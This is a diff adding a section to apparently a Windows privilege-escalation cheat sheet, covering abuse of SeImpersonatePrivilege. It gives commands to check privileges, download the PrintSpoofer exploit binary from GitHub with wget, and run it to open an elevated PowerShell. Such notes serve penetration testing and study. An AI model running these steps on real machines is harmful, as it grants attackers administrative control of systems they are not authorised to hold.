@@ -59,6 +59,18 @@ Don't forget to restart the service!
 Restart-Service VulnerableService
 ```
 
+### SeImpersonate
+If when running `whoami /priv` we notice that our current user has `SeImpersonatePrivilege`, then we have potential privesc:
+
+Grab the exploit binary like so:
+```powershell
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+```
+and run like so:
+```powershell
+.\PrintSpoofer64.exe -i -c powershell.exe
+```
+
 ## Manual PrivEsc
 
 ### Binary Hijacking
